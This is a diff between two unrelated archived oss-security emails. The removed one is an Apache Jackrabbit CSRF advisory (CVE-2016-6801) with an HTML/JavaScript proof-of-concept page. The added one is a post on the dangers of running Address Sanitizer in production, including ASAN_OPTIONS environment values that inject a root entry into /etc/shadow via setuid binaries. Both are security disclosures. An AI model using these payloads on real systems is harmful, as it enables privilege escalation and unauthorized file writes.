@@ -1,9 +1,9 @@
-X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
-	["1769" "Wednesday" "14" "September" "2016" "14:34:22" "+0200" "Julian Reschke" "reschke@apache.org" "<3bb23017-9519-7dfc-0c6c-7364fb5bae42@apache.org>" "58" "[oss-security] CVE-2016-6801: CSRF in Jackrabbit-Webdav using empty content-type" nil nil nil "9" "2016091412:34:22" "[oss-security] CVE-2016-6801: CSRF in Jackrabbit-Webdav using empty content-type" (number mark "U       reschke@apac Sep 14   58/1769  " thread-indent "\"[oss-security] CVE-2016-6801: CSRF in Jackrabbit-Webdav using empty content-type\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+X-VM-v5-Data: ([nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+	["3947" "Wednesday" "17" "February" "2016" "23:19:21" "+0100" "Szabolcs Nagy" "nsz@port70.net" "<20160217221921.GB24130@port70.net>" "99" "[oss-security] Address Sanitizer local root" "^Date:" nil nil "2" "2016021722:19:21" "[oss-security] Address Sanitizer local root" (number mark "        nsz@port70.n Feb 17   99/3947  " thread-indent "\"[oss-security] Address Sanitizer local root\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
 	nil)
-X-Mozilla-Status: 0000
+X-Mozilla-Status: 0001
 X-Mozilla-Status2: 00000000
-Received: (qmail 25848 invoked by uid 550); 14 Sep 2016 13:36:51 -0000
+Received: (qmail 17590 invoked by uid 550); 17 Feb 2016 22:23:06 -0000
 Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
 Precedence: bulk
 List-Post: <mailto:oss-security@lists.openwall.com>
@@ -11,78 +11,115 @@ List-Help: <mailto:oss-security-help@lists.openwall.com>
 List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
 List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
 List-ID: <oss-security.lists.openwall.com>
-Reply-To: oss-security@lists.openwall.com
-Received: (qmail 25644 invoked from network); 14 Sep 2016 12:34:46 -0000
-To: Lukas Reschke <lukas@statuscode.ch>,
- Jackrabbit Users <users@jackrabbit.apache.org>,
- "dev@jackrabbit.apache.org" <dev@jackrabbit.apache.org>,
- "security@apache.org" <security@apache.org>,
- oss-security@lists.openwall.com, bugtraq@securityfocus.com
-From: Julian Reschke <reschke@apache.org>
-Message-ID: <3bb23017-9519-7dfc-0c6c-7364fb5bae42@apache.org>
-Date: Wed, 14 Sep 2016 14:34:22 +0200
-User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:45.0) Gecko/20100101
- Thunderbird/45.2.0
+Received: (qmail 15374 invoked from network); 17 Feb 2016 22:19:33 -0000
+Message-ID: <20160217221921.GB24130@port70.net>
+Mail-Followup-To: oss-security@lists.openwall.com
 MIME-Version: 1.0
-Content-Type: text/plain; charset=utf-8; format=flowed
-Content-Transfer-Encoding: 7bit
-Subject: [oss-security] CVE-2016-6801: CSRF in Jackrabbit-Webdav using empty content-type
+Content-Type: text/plain; charset=us-ascii
+Content-Disposition: inline
+User-Agent: Mutt/1.5.24 (2015-08-30)
+Date: Wed, 17 Feb 2016 23:19:21 +0100
+From: Szabolcs Nagy <nsz@port70.net>
+Reply-To: oss-security@lists.openwall.com
+Subject: [oss-security] Address Sanitizer local root
+To: oss-security@lists.openwall.com
 
-CVE-2016-6801: CSRF in Jackrabbit-Webdav using empty content-type
+There is an alarming trend that Address Sanitizer and related
+compiler instrumentations from compiler-rt are used as a hardening
+solution and run in production.
 
-Severity: Important
+Even though these are debugging and testing tools, there is
+no clear warning against production use in their documentation:
+http://clang.llvm.org/docs/
+And it's obvious how a tool that catches UB can be misunderstood
+as a hardening tool:
 
-Vendor:
-The Apache Software Foundation
+This analysis concluded that ASan can be used for protection
+to stop certain attacks:
+http://scarybeastsecurity.blogspot.dk/2014/09/using-asan-as-protection.html
+The Tor project distributes ASan "hardened" binaries:
+https://blog.torproject.org/blog/tor-browser-55a4-hardened-released
+And there are various projects for full Linux distro instrumentation:
+http://balintreczey.hu/blog/progress-report-on-hardened1-linux-amd64-a-potential-debian-port-with-pie-asan-ubsan-and-more/
+https://blog.hboeck.de/archives/879-Safer-use-of-C-code-running-Gentoo-with-Address-Sanitizer.html
+(the later was presented at FOSDEM 2016: https://fosdem.org/2016/schedule/event/csafecode/ )
 
-Versions Affected:
-Apache Jackrabbit 2.4.5
-Apache Jackrabbit 2.6.5
-Apache Jackrabbit 2.8.2
-Apache Jackrabbit 2.10.3
-Apache Jackrabbit 2.12.3
-Apache Jackrabbit 2.13.2
+While these are interesting projects, ASan should not be
+used for hardening in production systems in its current form,
+so at least the language ("hardening", "protection", "safe")
+should be fixed.
 
-Description:
-The CSRF content-type check for POST requests does not handle missing 
-Content-Type header fields, nor variations in field values with respect 
-to upper/lower case or optional parameters. This can be exploited to 
-create a resource via CSRF.
+My simple local root exploit is that ASan uses a lot
+of environment variables without checking for secure
+execution of setuid binaries:
 
-Mitigation:
-2.4.x users upgrade to 2.4.5 and apply the patch in 
-http://svn.apache.org/r1758791 and/or upgrade to 2.4.6 once released
-2.6.x users upgrade to 2.6.5 and apply the patch in 
-http://svn.apache.org/r1758771 and/or upgrade to 2.6.6 once released
-2.8.x users upgrade to 2.8.2 and apply the patch in 
-http://svn.apache.org/r1758764 and/or upgrade to 2.8.3 once released
-2.10.x users should upgrade to 2.10.4
-2.12.x users should upgrade to 2.12.4
-2.13.x users should upgrade to 2.13.3
+ASAN_OPTIONS='verbosity=2 log_path=foo' ./suid.exe
 
-Example:
-A resource can be created like so:
-<html>
-   <body>
-     <script>
-       function submitRequest()
-       {
-         var xhr = new XMLHttpRequest();
-         xhr.open("POST", "http://localhost:42427/test/csrf.txt", true);
-         xhr.withCredentials = true;
-         var body = "This file has been uploaded via CSRF.=\r\n";
-         var aBody = new Uint8Array(body.length);
-         for (var i = 0; i < aBody.length; i++)
-           aBody[i] = body.charCodeAt(i);
-         xhr.send(new Blob([aBody]));
-       }
-     </script>
-     <form action="#">
-       <input type="button" value="Submit request" 
-onclick="submitRequest();" />
-     </form>
-   </body>
-</html>
+will write to foo.$PID using escalated priviledge, so a
+normal user may be able to clobber arbitrary root owned files
+(by creating foo.{1,2,3,..} symlinks to it) which can lead
+to local root on an "ASan hardened" Linux distribution:
 
-Credit:
-This issue was discovered by Lukas Reschke.
+ASAN_OPTIONS='suppressions="/foo
+root:passwdhash:12345:0:::::
+bar" log_path=foo' ./suid.exe
+
+can easily clobber /etc/shadow with
+
+AddressSanitizer: failed to read suppressions file '/foo
+root:passwdhash:12345:0:::::
+bar'
+
+if there is any setuid root executable built with ASan.
+
+(This is not a problem for testing where the env var based
+configuration is convenient and I haven't checked if any
+of the current ASan distro efforts have setuid executables
+with instrumentation, but I still find it a security bug
+given the improper advertisment of the sanitizer tools:
+this can lead to problems if the documentation is not fixed.)
+
+Beyond this trivial issue there are plenty reliability
+problems in the sanitizer runtimes that i think deserve
+at least a warning. It can crash conforming applications
+because
+
+- the shadow map overlaps with something
+- ulimit -v
+- overcommit is turned off
+- it allocates memory but aborts on failure
+- it interposes __tls_get_addr with non-as-safe code.
+- it uses initial-exec TLS.
+- it handles "deadly" signals like SIGBUS
+  (often used by applications using mmaped files).
+- the c runtime is updated and incompatible
+  (with the various interposition hacks)
+- does not handle c11 thread creation
+
+some of the features reduce security:
+
+- heuristic introspective unwind
+- nice diagnositc messages at undefined behaviour
+- interpositions in general (UB according to POSIX)
+
+other limitations:
+
+- static linking is not supported
+
+(This is for ASan only, I briefly looked at thread
+sanitizer, which seemed even worse for reliability
+and safe stack that is in fact advertised for hardening
+but it has plenty reliability problems, needs further
+analysis.)
+
+I believe some of the problems can be fixed by
+implementing the runtimes in the libc instead of
+second guessing libc behaviour with fragile
+heuristics from a compiler runtime.   This would solve
+most of the runtime aborts.  I can see an easy way to do
+this with musl libc (because a non-host musl is easy to
+distribute and link against), but non-trivial with glibc.
+In either case I don't see a solution to the shadow map
+commit charge unless the kernel is modified.  So I cannot
+recommend even a careful reimplementation in libc for
+production use for reliable systems.
